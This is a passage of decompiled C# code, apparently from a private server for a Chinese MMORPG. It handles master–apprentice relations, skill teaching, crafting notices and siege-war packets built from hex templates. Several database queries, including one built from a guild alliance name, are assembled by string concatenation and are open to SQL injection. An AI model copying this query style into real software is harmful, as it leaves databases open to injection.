				MainForm.WriteLine(1, "师徒系统取消 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 师徒请求接受(int id, string 对方名字)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write2(id);
			发包类.Write(15);
			发包类.WriteName(对方名字);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17168, base.人物全服ID);
			}
		}

		public void 取消师徒请求(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000FF034510120001020F0000000000000000000000000000000000000000008BA555AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			Buffer.BlockCopy(bytes, 0, array, 13, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 解除师徒关系请求(int id, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA552000D5034710120001010F000000000000000000000000000000000000000000DBE955AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 师徒系统解除(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = 封包数据[10];
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				switch (num)
				{
				case 1:
				{
					int num3 = 0;
					for (int k = 0; k < 3; k++)
					{
						if (徒弟数据[k].STNAME == text)
						{
							num3 = k;
							break;
						}
					}
					if (RxjhClass.解除师徒关系(text, base.UserName) == 1)
					{
						徒弟数据[num3].TID = -1;
						解除师徒关系请求(257, text);
						Players players2 = World.检查玩家name(text);
						if (players2 != null)
						{
							players2.师傅数据.TID = -1;
							players2.解除师徒关系请求(257, base.UserName);
						}
					}
					break;
				}
				case 2:
				{
					if (RxjhClass.解除师徒关系(base.UserName, text) != 1)
					{
						break;
					}
					师傅数据.TID = -1;
					解除师徒关系请求(257, text);
					Players players = World.检查玩家name(text);
					if (players == null)
					{
						break;
					}
					int num2 = 0;
					for (int j = 0; j < 3; j++)
					{
						if (players.徒弟数据[j].STNAME == text)
						{
							num2 = j;
							break;
						}
					}
					players.徒弟数据[num2].TID = -1;
					players.解除师徒关系请求(257, base.UserName);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "师徒系统解除 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 选取怪物封包(byte[] data, int lenght)
		{
			try
			{
				using 发包类 发包类 = new 发包类();
				发包类.Write4(BitConverter.ToInt32(data, 10));
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 35088, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 师徒武功检查(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && data[10 + i] != 0; i++)
				{
					array[i] = data[10 + i];
				}
				Players players = World.检查玩家name(Encoding.Default.GetString(array).Replace("\0", "").Trim());
				if (players != null)
				{
					byte[] array2 = Converter.hexStringToByte("AA550F00D5036110010003000000000000EC0F55AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(players.Player_Job), 0, array2, 10, 1);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
				else
				{
					byte[] array3 = Converter.hexStringToByte("AA550F00D5036110010003000000000000EC0F55AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Job), 0, array3, 10, 1);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "师徒武功检查 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 师徒传授武功(byte[] 封包数据, int length)
		{
			try
			{
				byte[] array = new byte[15];
				for (int i = 0; i < 15 && 封包数据[12 + i] != 0; i++)
				{
					array[i] = 封包数据[12 + i];
				}
				string text = Encoding.Default.GetString(array).Replace("\0", "").Trim();
				byte[] array2 = new byte[4];
				int num = 封包数据[27];
				Buffer.BlockCopy(封包数据, 28, array2, 0, 4);
				int num2 = BitConverter.ToInt32(array2, 0);
				Players players = World.检查玩家name(text);
				if (players == null || !World.TBL_KONGFU.TryGetValue(num2, out var value))
				{
					return;
				}
				if (players.Player_Job_leve < value.FLD_JOBLEVEL - 1)
				{
					string str = players.Player_Job_leve.ToString();
					string str2 = 1.ToString();
					系统提示("该徒弟只能传授最高(" + str + str2 + ")转的武功！", 9, " ");
					return;
				}
				int num3 = -1;
				for (int j = 0; j < 3; j++)
				{
					if (徒弟数据[j].STNAME == text)
					{
						num3 = j;
						break;
					}
				}
				if (num3 == -1)
				{
					return;
				}
				int fLD_AT = value.FLD_AT;
				int fLD_MP = value.FLD_MP;
				switch (players.师傅数据.STLEVEL)
				{
				case 2:
				case 3:
					if (num == 2)
					{
						系统提示("3/4级师徒只能传授二个武功！", 9, " ");
						return;
					}
					if (players.师傅数据.STLEVEL == 3)
					{
					}
					break;
				case 4:
				case 5:
				{
					if (num == 1 || num == 2)
					{
						系统提示("4/5级师徒只能传授第一个武功！", 9, " ");
						return;
					}
					int sTLEVEL = players.师傅数据.STLEVEL;
					break;
				}
				}
				switch (num)
				{
				case 0:
					徒弟数据[num3].STWG1 = num2;
					players.师傅数据.STWG1 = num2;
					break;
				case 1:
					徒弟数据[num3].STWG2 = num2;
					players.师傅数据.STWG2 = num2;
					break;
				default:
					徒弟数据[num3].STWG3 = num2;
					players.师傅数据.STWG3 = num2;
					break;
				}
				传授武功(num2, num3);
				players.传授武功(num2, num3);
				师傅更新师徒系统(num3);
				players.徒弟更新师徒系统();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "师徒传授武功 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex.Message);
			}
		}

		public void 传授武功(int 位置, int 武功ID)
		{
			byte[] array = Converter.hexStringToByte("AA551B00D50349100D0001CBE204000000000000000000000000000000A15D55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(武功ID), 0, array, 11, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 徒弟更新师徒系统()
		{
			if (师傅数据.STLEVEL > 0)
			{
				if (师傅数据.STLEVEL <= 3)
				{
					int num = 864000000;
					if (!追加状态列表.ContainsKey(900000451))
					{
						int 时间;
						状态效果(BitConverter.GetBytes(900000451), 1, 时间 = num + 3000);
						追加状态类 追加状态类2 = new 追加状态类(this, 时间, 900000451, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						addFLD_追加百分比_防御(0.05);
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
				if (师傅数据.STLEVEL <= 2)
				{
					int num2 = 864000000;
					if (!追加状态列表.ContainsKey(900000452))
					{
						int 时间2;
						状态效果(BitConverter.GetBytes(900000452), 1, 时间2 = num2 + 3000);
						追加状态类 追加状态类3 = new 追加状态类(this, 时间2, 900000452, 1);
						追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
						addFLD_追加百分比_攻击(0.05);
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
				if (师傅数据.STLEVEL == 1)
				{
					int num3 = 864000000;
					if (!追加状态列表.ContainsKey(900000462))
					{
						int 时间3;
						状态效果(BitConverter.GetBytes(900000462), 1, 时间3 = num3 + 3000);
						追加状态类 追加状态类4 = new 追加状态类(this, 时间3, 900000462, 1);
						追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
						base.FLD_人物_武功防御力增加百分比 += 0.05;
						base.人物追加最大_HP += 20;
						更新武功和状态();
						更新HP_MP_SP();
					}
				}
			}
			try
			{
				byte[] array = Converter.hexStringToByte("AA554E00BF054A1048000FC5A00000D000000000000000000000020A0204E40D00A025260001000000000000000000000000323032303032313330300000000000000000000000000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (师傅数据.STNAME != "")
				{
					byte[] bytes = Encoding.Default.GetBytes(师傅数据.STNAME);
					Buffer.BlockCopy(bytes, 0, array, 11, bytes.Length);
					Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STLEVEL), 0, array, 28, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.TLEVEL), 0, array, 27, 1);
					Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STYHD), 0, array, 30, 2);
					Players players = 得到人物数据(师傅数据.STNAME);
					if (players != null)
					{
						Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 26, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(players.Player_Level), 0, array, 27, 1);
					}
					else
					{
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 26, 1);
						Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.TLEVEL), 0, array, 27, 1);
					}
				}
				Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG1), 0, array, 38, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG2), 0, array, 42, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(师傅数据.STWG3), 0, array, 46, 4);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "徒弟更新师徒系统()出错" + base.人物全服ID + "| " + ex.Message);
			}
		}

		public void 计算师徒属性(int index)
		{
			if (徒弟数据[index].STLEVEL <= 0)
			{
				return;
			}
			if (徒弟数据[index].STLEVEL <= 3)
			{
				int num = 864000000;
				if (!追加状态列表.ContainsKey(900000451))
				{
					int 时间;
					状态效果(BitConverter.GetBytes(900000451), 1, 时间 = num + 3000);
					追加状态类 追加状态类2 = new 追加状态类(this, 时间, 900000451, 1);
					追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
				}
				addFLD_追加百分比_防御(0.05);
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
			if (徒弟数据[index].STLEVEL <= 2)
			{
				int num2 = 864000000;
				if (!追加状态列表.ContainsKey(900000452))
				{
					int 时间2;
					状态效果(BitConverter.GetBytes(900000452), 1, 时间2 = num2 + 3000);
					追加状态类 追加状态类3 = new 追加状态类(this, 时间2, 900000452, 1);
					追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
				}
				addFLD_追加百分比_攻击(0.05);
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
			if (徒弟数据[index].STLEVEL == 1)
			{
				int num3 = 864000000;
				if (!追加状态列表.ContainsKey(900000462))
				{
					int 时间3;
					状态效果(BitConverter.GetBytes(900000462), 1, 时间3 = num3 + 3000);
					追加状态类 追加状态类4 = new 追加状态类(this, 时间3, 900000462, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
				}
				base.FLD_人物_武功防御力增加百分比 += 0.05;
				base.人物追加最大_HP += 20;
				更新武功和状态();
				更新HP_MP_SP();
			}
		}

		public void 师傅更新师徒系统(int index)
		{
			byte[] array = Converter.hexStringToByte("AA554E0077044B104800020F000000000000000000000000000000010A02D0E50D00A0252600000000000000000000000000323032303032313330300020202020202020202020202020202000202020202055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			byte[] bytes = Encoding.Default.GetBytes(徒弟数据[index].STNAME);
			Buffer.BlockCopy(bytes, 0, array, 12, bytes.Length);
			if (得到人物数据(徒弟数据[index].STNAME) != null)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 27, 1);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 27, 1);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STLEVEL), 0, array, 29, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].TLEVEL), 0, array, 28, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STYHD), 0, array, 31, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG1), 0, array, 38, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG2), 0, array, 42, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(徒弟数据[index].STWG3), 0, array, 46, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(index), 0, array, 10, 1);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 灵宠强化提示(int ID, int ID2)
		{
			byte[] array = Converter.hexStringToByte("AA551900E2007A0314000200C4090000000000000300460000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(ID2), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 12, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 灵宠合成提示(int ID, int ID2, int ID3, 物品类 物品, int 是否成功)
		{
			byte[] array = Converter.hexStringToByte("AA55C600E2015100B80073010100000000009ACE9A3B000000000E00000094CE9A3B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E8030000000000000000000000000000B82200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID2), 0, array, 12, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
			Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
			Buffer.BlockCopy(物品.物品属性, 0, array, 38, 56);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 94, 4);
			Buffer.BlockCopy(BitConverter.GetBytes((long)ID3), 0, array, 98, 4);
			Buffer.BlockCopy(BitConverter.GetBytes((long)ID3), 0, array, 102, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(是否成功), 0, array, 110, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 炼金合成提示(int 操作ID, int ID, int ID2, 物品类 物品, int ID3)
		{
			byte[] array = Converter.hexStringToByte("AA55C600E2015100B80073010100000000009ACE9A3B000000000E00000094CE9A3B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000E8030000000000000000000000000000B82200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(操作ID), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 12, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID3), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(物品.物品位置), 0, array, 26, 4);
			Buffer.BlockCopy(物品.物品ID, 0, array, 30, 4);
			Buffer.BlockCopy(物品.物品属性, 0, array, 38, 56);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 94, 4);
			Buffer.BlockCopy(BitConverter.GetBytes((long)ID2), 0, array, 98, 4);
			Buffer.BlockCopy(BitConverter.GetBytes((long)ID2), 0, array, 102, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 加载攻城数据()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("SELECT * FROM 攻城城主 where 分区信息= '" + World.ZoneNumber + "'"), "GameServer");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count != 0)
			{
				World.攻城数据list.Clear();
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					攻城数据 攻城数据2 = new 攻城数据
					{
						ID = (int)dBToDataTable.Rows[i]["帮派ID"],
						行会名字 = dBToDataTable.Rows[i]["攻城行会名"].ToString(),
						天魔攻城时间 = DateTime.Parse(dBToDataTable.Rows[i]["攻城时间"].ToString()),
						天魔攻城奖励时间 = DateTime.Parse(dBToDataTable.Rows[i]["攻城奖励时间"].ToString()),
						城主名字 = dBToDataTable.Rows[i]["城主名字"].ToString(),
						分区信息 = dBToDataTable.Rows[i]["分区信息"].ToString()
					};
					攻城数据 攻城数据3 = 攻城数据2;
					World.攻城数据list.TryAdd(攻城数据3.ID, 攻城数据3);
					if (DateTime.Now < 攻城数据2.天魔攻城奖励时间)
					{
						World.天魔神宫占领者 = 攻城数据2.行会名字;
						World.天魔神宫占领时间 = 攻城数据2.天魔攻城时间;
						World.天魔神宫奖励时间 = 攻城数据2.天魔攻城奖励时间;
					}
					World.天魔临时占领者 = 攻城数据2.行会名字;
				}
			}
			dBToDataTable.Dispose();
		}

		public void 加载门战数据()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT * FROM 门战胜利门派 where 分区信息= '" + World.ZoneNumber + "'", "GameServer");
			if (dBToDataTable == null)
			{
				return;
			}
			if (dBToDataTable.Rows.Count != 0)
			{
				World.guildWarDataList.Clear();
				for (int i = 0; i < dBToDataTable.Rows.Count; i++)
				{
					GuildWarData 门战数据2 = new GuildWarData
					{
						ID = (int)dBToDataTable.Rows[i]["帮派ID"],
						GuildName = dBToDataTable.Rows[i]["门派名字"].ToString(),
						WarTime = DateTime.Parse(dBToDataTable.Rows[i]["胜利时间"].ToString()),
						RewardTime = DateTime.Parse(dBToDataTable.Rows[i]["胜利奖励时间"].ToString()),
						LeaderName = dBToDataTable.Rows[i]["门主名字"].ToString()
					};
					World.guildWarDataList.TryAdd(门战数据2.ID, 门战数据2);
					World.门战占领者 = 门战数据2.GuildName;
				}
			}
			dBToDataTable.Dispose();
		}

		public void 发送天魔神宫邀请()
		{
			byte[] array = Converter.hexStringToByte("AA551C00280305510E000000000001000000020011A40000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送攻城战剩余时间(int 剩余时间)
		{
			string hex = "AA55860067055301800007000A000000010001000000000000007706000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(剩余时间), 0, array, 26, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 活动邀请银币市场()
		{
			string hex = "AA5514002C0503510E0000000000FFFFFFFFFFFF0700000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发出攻城战准备开始第二次通知()
		{
			string hex = "AA551400B90005510E000000000001000000020011A4000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 天魔神宫正城门已开启()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA550B000000D40405002E4000000055AA");
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫东城门已开启()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA550B000000D40405002F4000000055AA");
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫雕像击杀()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [TBL_XWWL_Guild] where G_Name='" + base.门派联盟盟主 + "'");
			DBA.ExeSqlCommand(string.Format("UPDATE 攻城城主 SET 城主名字='{1}', 攻城行会名='{2}', 帮派ID={3} WHERE 分区信息='{0}'", World.ZoneNumber, dBToDataTable.Rows[0]["G_Master"].ToString(), base.门派联盟盟主, base.帮派Id));
			dBToDataTable.Dispose();
		}

		public void 天魔神宫雕像击杀移动(Players 人物)
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "' ");
			string b = dBToDataTable.Rows[0]["攻城行会名"].ToString();
			if (人物.人物坐标_地图 == 42001)
			{
				if (人物.门派联盟盟主 == b)
				{
					人物.天魔移动(-427f, -13f, 15f, 42001);
				}
				else
				{
					人物.天魔移动(-431f, -681f, 15f, 42001);
				}
			}
			dBToDataTable.Dispose();
		}

		public void 天魔神宫攻城胜利包(Players 人物)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA553A000100400223001F0066000C33015301600007000B000000012003E02D020D0000000000000000000000000000000000E00F40000000000000000055AA");
				byte[] bytes = Encoding.Default.GetBytes(人物.帮派名字);
				Buffer.BlockCopy(bytes, 0, array, 34, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(人物.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
					发送当前范围广播数据(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫守城胜利结束包(Players 人物)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5566000B01530160000700090000000100A946000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "'");
				byte[] bytes = Encoding.Default.GetBytes(dBToDataTable.Rows[0]["攻城行会名"].ToString());
				Buffer.BlockCopy(bytes, 0, array, 74, bytes.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(人物.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
					发送当前范围广播数据(array, array.Length);
					dBToDataTable.Dispose();
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫显示图标(Players players, int 人数)
		{
			try
			{
				if (World.JlMsg == 1)
				{
					MainForm.WriteLine(0, "Players_显示攻城队员");
				}
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "'");
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write2(人数);
					发包类.Write2(0);
					for (int i = 0; i < 人数; i++)
					{
						发包类.Write2(players.人物全服ID);
						发包类.Write2(0);
						if (players.门派联盟盟主 == dBToDataTable.Rows[0]["攻城行会名"].ToString())
						{
							发包类.Write(1);
						}
						else
						{
							发包类.Write(2);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write2(0);
						发包类.Write(0);
						发包类.Write(40);
						发包类.Write2(0);
						发包类.Write(0);
						发包类.Write4(-1);
						发包类.Write4(0);
						发包类.Write2(players.帮派Id);
						发包类.Write2(3);
						DataTable dataTable = RxjhClass.得到帮派数据(players.帮派名字);
						if (dataTable.Rows[0]["G_Master"].ToString() != players.UserName)
						{
							发包类.Write(0);
						}
						else
						{
							发包类.Write(1);
						}
						dataTable.Dispose();
					}
					if (players.Client != null)
					{
						players.Client.SendPak(发包类, 2129, base.人物全服ID);
						players.发送当前范围广播数据(发包类, 2129, base.人物全服ID);
					}
				}
				dBToDataTable.Dispose();
			}
			catch (Exception)
			{
			}
		}

		public void 发送周围玩家攻城战中图标()
		{
			if (base.人物坐标_地图 != 42001)
			{
				return;
			}
			string hex = "AA556D0072050851670003000000";
			byte[] array = Converter.hexStringToByte(hex);
			string hex2 = "55AA";
			byte[] array2 = Converter.hexStringToByte(hex2);
			string hex3 = "7205000001000000000000000000000000000000FFFFFFFF00000000D0791D0101";
			byte[] array3 = Converter.hexStringToByte(hex3);
			List<Players> list = 获取范围玩家(300);
			byte[] array4 = new byte[array.Length + array3.Length * list.Count + array2.Length];
			Buffer.BlockCopy(array, 0, array4, 0, array.Length);
			array4[array4.Length - 2] = 85;
			array4[array4.Length - 1] = 170;
			for (int i = 0; i < list.Count; i++)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(list[i].人物全服ID), 0, array3, 0, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(list[i].帮派Id), 0, array3, 28, 4);
				if (list[i].门派联盟盟主 == World.天魔神宫占领者)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 4, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 4, 4);
				}
				if (list[i].帮派人物等级 == 6)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 32, 1);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 32, 1);
				}
				Buffer.BlockCopy(array3, 0, array4, 14 + i * array3.Length, array3.Length);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(list.Count), 0, array4, 10, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(array3.Length * list.Count + 4), 0, array4, 8, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(array3.Length * list.Count + 10), 0, array4, 2, 2);
			if (base.Client != null)
			{
				base.Client.Send(array4, array4.Length);
			}
		}

		public void 天魔回城(byte[] 封包数据, int 封包大小)
		{
			天魔移动(10f, 10f, 15f, 1201);
		}

		public void 更新武功冷却()
		{
			try
			{
				int num = 0;
				foreach (武功类 value in World.TBL_KONGFU.Values)
				{
					if (base.Player_Job == value.FLD_JOB || value.FLD_JOB == 0)
					{
						num++;
					}
				}
				if (num == 0)
				{
					return;
				}
				using 发包类 发包类 = new 发包类();
				发包类.Write2(1);
				发包类.Write2(1);
				发包类.Write2(num);
				foreach (武功类 value2 in World.TBL_KONGFU.Values)
				{
					if (base.Player_Job == value2.FLD_JOB || value2.FLD_JOB == 0)
					{
						发包类.Write8(value2.FLD_PID);
						发包类.Write8(0L);
						发包类.Write8(0L);
						发包类.Write8(0L);
						发包类.Write8(value2.FLD_CDTIME);
						发包类.Write8(0L);
						发包类.Write8(0L);
						发包类.Write4(0);
					}
				}
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 4610, base.人物全服ID);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "更新技能冷却出错" + base.人物全服ID + "|" + ToString() + " " + ex.Message);
			}
		}

		public void 活动邀请银币(byte[] 封包数据, int 封包大小)
		{
			Random random = new Random();
			int num = random.Next(-100, 60);
			int num2 = random.Next(-130, 30);
			if (World.当前是否是银币线路 == 0)
			{
				移动切换画面();
				天魔换线移动(num, num2, 15f, 1201);
			}
			else
			{
				天魔移动(num, num2, 15f, 1201);
			}
		}

		public void 天魔神宫邀请(byte[] 封包数据, int 封包大小)
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "'");
			if (dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.门派联盟盟主)
			{
				World.申请攻城人物列表.Add(this);
				if (World.是否开启共用银币市场 == 1)
				{
					移动切换画面();
					天魔换线移动(-427f, -13f, 15f, 42001);
				}
				else
				{
					天魔移动(-427f, -13f, 15f, 42001);
				}
			}
			else if (base.帮派名字 == string.Empty)
			{
				系统提示("你还没加入门派，请加入门派再来参加！", 9, "系统提示");
			}
			else
			{
				World.申请攻城人物列表.Add(this);
				if (World.是否开启共用银币市场 == 1)
				{
					移动切换画面();
					天魔换线移动(-431f, -681f, 15f, 42001);
				}
				else
				{
					天魔移动(-431f, -681f, 15f, 42001);
				}
			}
			dBToDataTable.Dispose();
		}

		public void OpClient(int iOpCode)
		{
			byte[] array = Converter.hexStringToByte("AA5512000100BB00040001000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(iOpCode), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			Thread.Sleep(100);
		}

		public void 关闭商店(int 商店ID_)
		{
			byte[] array = new byte[2];
			byte[] array2 = new byte[2];
			Buffer.BlockCopy(BitConverter.GetBytes(商店ID_), 0, array, 0, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 0, 2);
			byte[] array3 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
			打开仓库中 = false;
			合成系统解锁();
			Buffer.BlockCopy(array, 0, array3, 18, 2);
			Buffer.BlockCopy(array2, 0, array3, 10, 2);
			Buffer.BlockCopy(array2, 0, array3, 14, 2);
			base.当前操作NPC = 0;
